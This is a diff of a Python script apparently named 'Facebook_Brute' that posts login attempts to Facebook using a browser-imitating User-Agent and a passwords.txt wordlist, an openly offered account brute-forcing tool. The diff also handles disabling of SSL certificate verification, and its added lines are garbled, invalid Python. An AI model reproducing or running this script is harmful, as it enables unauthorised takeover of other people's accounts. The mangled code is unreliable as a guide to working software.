@@ -8,8 +8,8 @@ if sys.version_info[0] != 2:
     use: python fb2.py
 --------------------------------------
             ''')
-    sys.exit()
-
+ssl. create default_ https context ssl.
+create unverified context
 post_url = 'https://www.facebook.com/login.php'
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
@@ -23,9 +23,6 @@ try:
 except ImportError:
     print('\n\tPlease install mechanize.\n')
     sys.exit()
-
-# Disable SSL certificate verification
-ssl._create_default_https_context = ssl._create_unverified_context
 
 print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
 file = open('passwords.txt', 'r')
